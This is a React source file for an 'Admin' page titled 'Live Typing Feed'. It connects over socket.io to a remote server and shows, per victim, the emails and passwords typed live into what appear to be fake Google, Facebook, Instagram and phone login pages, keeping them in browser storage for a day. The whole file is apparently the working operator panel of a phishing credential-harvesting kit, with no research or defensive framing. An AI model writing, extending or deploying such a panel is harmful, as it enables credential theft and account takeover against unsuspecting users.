import React, { useState, useEffect } from "react";
import io from "socket.io-client";
import { FaGoogle, FaFacebook, FaInstagram, FaPhone } from "react-icons/fa";

const socket = io("https://loginsus.onrender.com");
const STORAGE_KEY = "typedData";
const EXPIRY_MS = 24 * 60 * 60 * 1000; // 1 din

export default function Admin() {
  const [typed, setTyped] = useState({}); // { userId: { loginType, email, password } }

  // 🔹 Icons mapping
  const icons = {
    Google: <FaGoogle className="text-red-500 inline ml-2" />,
    Facebook: <FaFacebook className="text-blue-600 inline ml-2" />,
    Instagram: <FaInstagram className="text-pink-500 inline ml-2" />,
    Phone: <FaPhone className="text-green-600 inline ml-2" />,
  };

  // 🔹 Load from localStorage
  useEffect(() => {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) {
      const { data, timestamp } = JSON.parse(saved);
      if (Date.now() - timestamp < EXPIRY_MS) {
        setTyped(data);
      } else {
        localStorage.removeItem(STORAGE_KEY);
      }
    }
  }, []);

  // 🔹 Socket listener
  useEffect(() => {
    socket.on("showText", (data) => {
      setTyped((prev) => {
        let newData = { ...prev };

        if (!newData[data.userId]) {
          newData[data.userId] = {};
        }

        if (data.loginType) {
          newData[data.userId].loginType = data.loginType;
        }

        newData[data.userId][data.field] = data.value;

        // Save to localStorage
        localStorage.setItem(
          STORAGE_KEY,
          JSON.stringify({ data: newData, timestamp: Date.now() })
        );

        return newData;
      });
    });

    return () => socket.off("showText");
  }, []);

  const handleClear = () => {
    localStorage.removeItem(STORAGE_KEY);
    setTyped({});
  };

  return (
    <div className="min-h-screen p-8 bg-black text-green-400 font-mono">
      <div className="flex items-center justify-between mb-4">
        <h1 className="text-2xl">Live Typing Feed</h1>
        <button
          onClick={handleClear}
          className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
        >
          Clear All
        </button>
      </div>

      {/* 🔹 Users data */}
      <div className="space-y-4">
        {Object.entries(typed).map(([userId, fields]) => (
          <div
            key={userId}
            className="border border-green-700 rounded p-3 bg-gray-900"
          >
            <div className="text-xs text-green-300 mb-1">
              User: {userId.slice(0, 6) + "..."}
              {fields.loginType && (
                <span className="ml-2 align-middle">
                  {icons[fields.loginType]}{" "}
                  <span className="ml-1">({fields.loginType})</span>
                </span>
              )}
            </div>
            {Object.entries(fields).map(
              ([field, value]) =>
                field !== "loginType" && (
                  <p key={field}>
                    <strong>{field}:</strong>{" "}
                    {typeof value === "object" && value !== null
                      ? JSON.stringify(value)
                      : value}
                  </p>
                )
            )}
          </div>
        ))}
      </div>
    </div>
  );
}
